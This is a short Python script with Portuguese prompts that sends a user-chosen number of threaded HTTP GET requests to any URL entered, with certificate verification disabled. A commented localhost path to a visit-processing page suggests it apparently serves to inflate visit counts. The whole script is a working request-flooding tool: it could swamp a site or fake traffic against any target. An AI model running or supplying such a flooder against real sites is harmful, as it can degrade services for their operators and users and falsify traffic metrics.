from ast import While
import threading
import requests
import urllib3

def flood(url):
	urllib3.disable_warnings()
	return requests.get(url, verify=False)

carga = input("Quantidade de clicks: ")
link = input("Cole o link aqui: ")
contador = 0
while(contador <= int(carga)):
    #link = 'http://localhost/dashboard/web/2022/meus/flodar/processa_vis.php'
    t = threading.Thread(target=flood,args=(link,))
    print("Click "+str(contador))
    t.start()
    contador = contador + 1

# Artigo de referencia
# https://alissonmachado.com.br/python-threads#:~:text=Threads%20s%C3%A3o%20uma%20forma%20de,como%20por%20exemplo%20o%20Apache.